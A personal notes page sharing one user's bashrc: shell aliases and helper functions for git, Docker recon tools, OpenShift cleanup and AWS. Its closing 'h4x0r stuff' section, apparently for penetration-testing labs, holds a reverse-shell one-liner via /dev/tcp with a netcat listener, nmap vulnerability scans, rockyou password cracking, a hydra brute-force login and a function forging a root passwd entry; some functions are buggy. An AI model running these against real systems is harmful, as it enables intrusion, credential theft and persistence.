---
layout: memory
title: Benji's bashrc
---

Some more or less helpful aliases and helper functions used by me in different machines.

```bash
# ----------------------
# Benji's Aliases
# ----------------------
alias gitRepos='cd /c/Benji/GitRepos'

## get rid of command not found ##
alias cd..='cd ..'
 
## a quick way to get out of current directory ##
alias bashrc='vim ~/.bashrc'
alias zshrc='vim ~/.zshrc'
alias ~='cd ~'
alias ..='cd ..'
alias ...='cd ../../../'
alias ....='cd ../../../../'
alias .....='cd ../../../../'
alias .4='cd ../../../../'
alias .5='cd ../../../../..'

## Colorize the ls output ##
alias ls='ls --color=auto'
 
## Use a long listing format ##
alias ll='ls -lah'
alias lsl='ls -lah --color=auto'

## Show hidden files ##
alias l.='ls -d .* --color=auto'

## Colorize the grep command output for ease of use (good for log files)##
alias grep='grep --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'

## generate sha1 digest
alias sha1='openssl sha1'

## Add safety nets
# do not delete / or prompt if deleting more than 3 files at a time #
alias rm='rm -I --preserve-root'
 
# confirmation #
alias mv='mv -i'
alias cp='cp -i'
alias ln='ln -i'

## this one saved by butt so many times! Resume wget by default ... ##
alias wget='wget -c'


# configuration  for the 
eval "$(pip completion --bash)"

## set some other defaults ##
alias df='df -H'
alias du='du -ch'
alias q!='exit'
alias h='history'
alias k='kill'
alias meow='cat'

# ----------------------
# Docker Aliases
# ----------------------
alias docker='sudo docker'
alias aiodns='sudo docker run --rm -it aiodns -r dns_resolver.txt -w subdomain_list.txt -t 8 --output json '
alias sublister='sudo docker run -it sublister -d '
alias parameth='sudo docker run -it parameth'
alias hakrawler='sudo docker run -it hakrawler '
alias arjun='docker run -it arjun '
alias eyewitness='python3 /home/kali/tools/EyeWitness/EyeWitness.py'

# ----------------------
# Maven Aliases
# ----------------------
alias mvnDependencies='mvn dependency:tree -Dverbose -Dincludes=commons-collections'
alias mvnDisplayDependencyUpdates='mvn versions:display-dependency-updates'

# ----------------------
# Apache & MySQL Aliases
# ----------------------
alias startapache2='sudo service apache2 start'
alias stopapache2='sudo service apache2 stop'
alias startmysql='sudo service mysql start'
alias stopmysql='sudo service mysql stop'

# ----------------------
# Git Aliases
# ----------------------
alias ga='git add'
alias gaa='git add .'
alias gaaa='git add --all'
alias gau='git add --update'
alias gb='git branch'
alias gbd='git branch --delete '
alias gc='git commit'
alias gcl='git clone --recursive'
alias gcm='git checkout master'
alias gcf='git commit --fixup'
alias gco='git checkout'
alias gcob='git checkout -b'
alias gcos='git checkout staging'
alias gcod='git checkout develop'
alias gd='git diff'
alias gda='git diff HEAD'
alias gi='git init'
alias glg='git log --graph --oneline --decorate --all'
alias gld='git log --pretty=format:"%h %ad %s" --date=short --all'
alias gm='git merge --no-ff'
alias gma='git merge --abort'
alias gmc='git merge --continue'
alias gp='git push'
alias gl='git pull'
alias gpr='git pull --rebase'
alias gr='git rebase'
alias gst='git status'
alias gss='git status --short'
alias gs='git stash'
alias gsta='git stash apply'
alias gstd='git stash drop'
alias gstl='git stash list'
alias gstp='git stash pop'
alias gsts='git stash save'

# ----------------------
#  Network aliases
# ----------------------
alias enable_monitor='sudo ifconfig wlan0 down && iwconfig wlan0 mode Monitor && ifconfig wlan0 up'
alias lanip6='sudo ifconfig eth0 | grep inet6 | grep 128 | awk '\''{print $2}'\'''
alias lanip4='sudo ifconfig eth0 | grep inet | grep netmask | awk '\''{print $2}'\'''
alias wanip='echo $(curl -s https://api.ipify.org)'
alias wanip6='echo $(curl -s https://api6.ipify.org)'
alias ports='netstat -tulanp'

# ----------------------
#  Exports and shit
# ----------------------

export COLORED_FAIL="\e[31mFAILED\e[32m:"
export COLORED_WARN="\e[34mWARN\e[33m:"
export COLORED_INFO="\e[34mINFO\e[34m:"

# ----------------------
#  Functions
# ----------------------

function extract () {
    if [ -f \$1 ] ; then
        case \$1 in
            *.tar.bz2)   tar xvjf \$1        ;;
            *.tar.gz)    tar xvzf \$1     ;;
            *.bz2)       bunzip2 \$1       ;;
            *.rar)       unrar x \$1     ;;
            *.gz)        gunzip \$1     ;;
            *.tar)       tar xvf \$1        ;;
            *.tbz2)      tar xvjf \$1      ;;
            *.tgz)       tar xvzf \$1       ;;
            *.zip)       unzip \$1     ;;
            *.Z)         uncompress \$1  ;;
            *.7z)        7z x \$1    ;;
            *)           echo \"'\$1' cannot be extracted via >extract<\" ;;
        esac
    else
        echo \"'\$1' is not a valid file\"
    fi
}

function countLocs() {
    if [ -z "$1" ]; then
        logError "Missing argument call this function like 'count_locs py' to count all LoCs of all present python files"
    else
        find . -name '*.$1' | xargs wc -l
    fi
}

function cleanRemoteGitBranches() {
    git fetch --all --prune
}

function removeLocalGitBranchesExceptMaster() {
    set -e
    read -p  "Do you really want to delete all local and unused remote git branches except the master? (y/Y): " userInput

    if [ "$userInput" == "y" ] || [ "$userInput" == "Y" ]; then
        cleanRemoteGitBranches
        git branch | grep -v "master" | xargs git branch -D
    else
        logWarn "You are a chicken, cha-caw, bah-gawk"
    fi
}

### Git stuff ###
function glf() { git log --all --grep="$1"; }

function exportDefaultPS1() {
    export PS1=$PS1_DEFAULT
}

### logging stuff ### 
function logInfo() {
    echo -e "${COLORED_INFO} $1 \e[0m"
}

function logWarn() {
    echo -e "${COLORED_WARN} $1 \e[0m"
}

function logError() {
    echo -e "${COLORED_FAIL} $1 \e[0m"
}

### python stuff ###
alias serveFiles='python -m SimpleHTTPServer 80'

function runTrufflehog() {
    if [ -z "$1" ]; then
        logError "Add a GitHub Repository to scan as argument"
        return 1
    fi 

    trufflehog --regex --entropy=True $1
}

function runBandit() {
    logInfo "Running bandit security checks"
    bandit -r .
    logInfo "Done"  
}

function runAllPythonTests() {
    logInfo "Running all python tests"
    python -m unittest discover .
    logInfo "Done"  
}

function runAutoPep8() {
    logInfo "Running recursive autopep8"
    autopep8 --in-place --recursive .
    logInfo "Done"  
}

function runPyCodeStyle() {
    pycodestyle --show-source --show-pep8 --max-line-length=1000 .
}

function runCraftRequirementsTxt() {
    pip freeze > requirements.txt
}

function jsonPrettyPrint() {
    if [ -z "$1" ]; then
        logError "You need to pass a json file to this function"
        return 1
    fi 

    python -m json.tool $1
}

### AWS CLI stuff ###
function setAwsCredentials() {
    if [ -z "$1" ]; then
        logError "Two Arguments are needed 1.AWS_ACCESS_KEY_ID 2.AWS_SECRET_ACCESS_KEY "
    fi

    logInfo "Setting AWS Credentials"
    export AWS_ACCESS_KEY_ID=$1
    export AWS_SECRET_ACCESS_KEY=$2
}

function s3ls(){
    aws s3 ls s3://$1
}

function s3cp(){
    aws s3 cp $2 s3://$1 
}

function appendTXTExtensionToEveryFile() {
    appendFileExtensionToEveryFile txt
}

function appendFileExtensionToEveryFile() {
    if [ -z "$1" ]; then
        logError "You need to pass a file extension e.g. txt or json"
        return 1
    fi 

    for f in *; do mv "$f" "$f.$1"; done
}

#### OpenShift Stuff ###
function removeAllFailedBuildsDryRun() {
  for build in $(oc get builds | grep Failed | awk '{print $1}'); do oc delete build ${build} --dry-run=client; done
}

function removeAllGarbageBuilds() {
  for build in $(oc get builds | grep 'Cancelled\|Failed\|Error' | awk '{print $1}'); do oc delete build ${build}; done
}

function removeAllGarbagePods() {
  for pod in $(oc get pods | grep 'Error\|ImagePullBackOff' | awk '{print $1}'); do oc delete pod ${pod}; done
}

function removeAllPodsInStateTerminating() {
  for terminating_pod in $(oc get pods | grep 'Terminating' | awk '{print $1}'); do oc delete pod ${terminating_pod} --grace-period=0 --force; done
}

function removeAllGarbageReplicaSets() {
 for replicaset in $(oc get rs | awk '{if ($2 + $3 + $4 == 0) print $1}' | grep -v 'NAME'); do oc delete rs ${replicaset}; done
}

#### OpenShift Secrets + SealedSecrets
function createSealedSecretQA() {
 if [ -z "$1" ]; then
   logError "Please provide the YAML of the secret, that shall be encrypted"
   return 1
 fi   
 kubeseal --cert $KUBESEAL_HOME/sealing-key-qa.pem -f $1 -w sealed-secret-$1 -v 5 -o yaml
}

function createSealedSecretProd() {
 if [ -z "$1" ]; then
   logError "Please provide the YAML of the secret, that shall be encrypted"
   return 1
 fi   
 kubeseal -v --cert $KUBESEAL_HOME/sealing-key-prod.pem -f -$1 w sealed-secret-$1 -v 5 -o yaml
}

function createOpenShiftSecretUsernamePassword() {
 if [ -z "$1" ]; then
   logError "Please provide a Username"
   return 1
 elif [ -z "$2" ]; then
   logError "Please provide a Password"
   return 1
 fi   
 
 oc create secret generic geheimnis --from-literal=user=$1 --from-literal=password=$2 --dry-run=client -oyaml > geheimnis.yaml
}

# ----------------------
#  h4x0r stuff
# ----------------------

### NMAP scans ###
function tcpall () {
  sudo nmap -sV -sC -p- -oN $1_tcp_all.txt $1
}

function udpall () {
  sudo nmap -sV -sC -sU -oN $1_tcp_all.txt $1
}

function defaultNmapScan () {
    sudo nmap -p- -sV -sC -A --min-rate 1000 --max-retries 5 -oN $1_all.txt $1
}

function quickNmapScan () {
    nmap --script vuln -oN $1_quick.txt $1
}

function printReverseShellCmd() {
    echo "bash -c 'bash -i >& /dev/tcp/$1/9001 0>&1'"
}

function reverseShellListener() {
    nc -lvnp 9001
}

## crack stuff
function crackZip () {
    fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' "$1"
}

function johnRocks () {
    john --wordlist=/usr/share/wordlists/rockyou.txt $1
}

function hydraBruteForceLogin () {
    # pass the target IP
    hydra -l admin -P /usr/share/wordlists/rockyou.txt $1 http-post-form "/login:username=^USER^&password=^PASS^:F=failed"
}

function addUserPasswordToPasswd () {
    USER=$1
    PASSWD=$2

    local generated_passwd=$(openssl passwd -1 -salt $1 $2)

    ${USER}:${generated_passwd}:UID:GUID:root:/root:/bin/bash
}
```
